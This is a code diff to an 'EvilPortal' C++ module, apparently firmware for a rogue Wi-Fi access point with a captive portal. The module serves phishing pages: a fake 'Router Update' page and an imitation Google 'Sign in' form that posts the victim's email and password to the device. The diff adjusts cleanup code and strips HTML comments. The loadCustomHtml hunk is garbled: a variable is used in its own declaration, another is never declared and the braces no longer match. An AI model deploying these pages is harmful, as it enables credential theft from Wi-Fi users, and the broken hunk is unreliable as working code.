@@ -26,6 +26,7 @@ EvilPortal::EvilPortal(
 }
 
 EvilPortal::~EvilPortal() {
+    dnsServer.stop();
     // Clean up handler to prevent memory leak
     if (_captiveHandler) {
         webServer.removeHandler(_captiveHandler);
@@ -33,7 +34,7 @@ EvilPortal::~EvilPortal() {
         _captiveHandler = nullptr;
     }
     webServer.end();
-    dnsServer.stop();
+    wifiDisconnect();
     vTaskDelay(100 / portTICK_PERIOD_MS);
 }
 
@@ -299,15 +300,6 @@ void EvilPortal::loop() {
         }
 
         if (check(EscPress)) {
-            // Clean up portal services
-            if (_captiveHandler) {
-                webServer.removeHandler(_captiveHandler);
-                delete _captiveHandler;
-                _captiveHandler = nullptr;
-            }
-            webServer.end();
-            dnsServer.stop();
-            vTaskDelay(100 / portTICK_PERIOD_MS);
             return;
         }
 
@@ -415,9 +407,7 @@ void EvilPortal::loadCustomHtml() {
     if (htmlFile) {
         String firstLine = htmlFile.readStringUntil('\n');
         htmlFile.close();
-        int apStart = firstLine.indexOf("<!-- AP=\"");
-        if (apStart != -1) {
-            int apEnd = firstLine.indexOf("\" -->", apStart);
+        int apStart = firstLine.indexOf("", apStart);
             if (apEnd != -1) { apName = firstLine.substring(apStart + 9, apEnd); }
         }
     }
@@ -473,7 +463,7 @@ void EvilPortal::loadDefaultHtml_one() {
         "5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover "
         "{background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: "
         "60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div "
-        "class='container'><!-- Ícone No Signal em SVG --><svg xmlns='http://www.w3.org/2000/svg' "
+        "class='container'><svg xmlns='http://www.w3.org/2000/svg' "
         "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 "
         "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 "
         "13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
@@ -517,7 +507,7 @@ void EvilPortal::loadDefaultHtml() {
         "class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg "
         "PUBLIC '-//W3C//DTD SVG 20010904//EN' "
         "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div "
-        "class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo' "
+        "class=form-container><center><div class='containerlogo'><div id='logo' "
         "title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' "
         "aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
         "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 "
@@ -541,7 +531,7 @@ void EvilPortal::loadDefaultHtml() {
         "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
         "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
         "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
-        "4.69-1.856z'></path></g></svg></div><!-- /Google Logo --></div></center><div style='min-height: "
+        "4.69-1.856z'></path></g></svg></div></div></center><div style='min-height: "
         "150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
         "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
         "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
